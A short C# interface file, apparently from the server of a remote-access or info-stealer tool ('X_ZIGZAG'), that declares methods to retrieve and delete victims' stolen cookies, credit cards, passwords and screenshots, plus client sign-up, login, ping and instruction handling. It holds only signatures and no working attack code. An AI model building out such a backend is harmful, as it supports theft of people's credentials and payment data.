using Microsoft.AspNetCore.Mvc;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Request;
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Response;

namespace X_ZIGZAG_SERVER_WEB_API.Interfaces
{
    public interface IClientService
    {
        public Task<ClientResponse> GetAll();
        public Task<ClientInfoResponseVM>? GetOne(string uuid);
        public Task<List<CookieVM>> GetCookies(string uuid);
        public Task<List<CreditCardVM>> GetCreditCards(string uuid);
        public Task<List<PasswordVM>> GetPasswords(string uuid);
        public Task<ScreensVM>? GetScreenshots(string uuid);
        public void DeleteAllScreenShots(string uuid);
        public Task DeleteAllCookies(string uuid);
        public Task DeleteAllCreditCards(string uuid);
        public Task DeleteAllPasswords(string uuid);

        public FileResult? GetScreenshot(string uuid,int screenIndex,string screenshotFileName);
        public FileResult? GetScreenshotPreview(string uuid,int screenIndex,string screenshotFileName);
        public Task<UpdateClientSettingsVM> UpdateSetting(string uuid, SettingsRequestVM setting);
        public Task<ClientActionResponse> UpdateInfo(ClientInfoVM info,long instructionId);
        public Task<Boolean> Login(ClientLoginVM LoginInfo);
        public Task<ClientActionResponse> SignUp(ClientInfoVM Info);
        public Task<ClientPingResponse> Check(string uuid);

    }
}
